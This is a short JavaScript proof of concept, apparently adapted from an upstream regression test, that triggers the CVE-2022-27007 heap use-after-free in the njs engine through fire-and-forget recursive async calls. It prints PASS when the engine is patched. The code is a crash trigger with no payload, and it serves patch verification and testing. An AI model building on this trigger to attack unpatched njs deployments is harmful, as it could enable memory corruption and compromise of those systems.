// CVE-2022-27007 PoC  (use-after-free in njs_function_frame_alloc)
// Based on the upstream regression test test/js/async_recursive_mid.t.js.
//
// The recursive call is NOT awaited: each f(v+1) is scheduled on the
// microtask queue, so the native C stack stays shallow (no stack overflow
// even under AddressSanitizer). The vulnerability is that the async frame's
// spare memory is reused after being freed -> heap-use-after-free, which
// ASAN traps on the BUGGY njs. The FIXED njs clears the spare pointers and
// completes cleanly, printing the expected stage trace.

let stages = [];

async function f(v) {
    if (v == 1000) {
        return;
    }

    stages.push('f>' + v);

    await 'X';

    f(v + 1);          // fire-and-forget: drives the frame reuse path, shallow stack

    stages.push('f<' + v);
}

f(0)
.then(function () {
    // Expected order for the first few frames on a correct (fixed) engine.
    var got = stages.slice(0, 5).join(',');
    var want = 'f>0,f>1,f<0,f>2,f<1';
    if (got === want) {
        console.log('CVE-2022-27007: PASS (fixed) stages=' + got);
    } else {
        console.log('CVE-2022-27007: UNEXPECTED stages=' + got);
    }
})
.catch(function (e) {
    console.log('CVE-2022-27007: error ' + e);
});
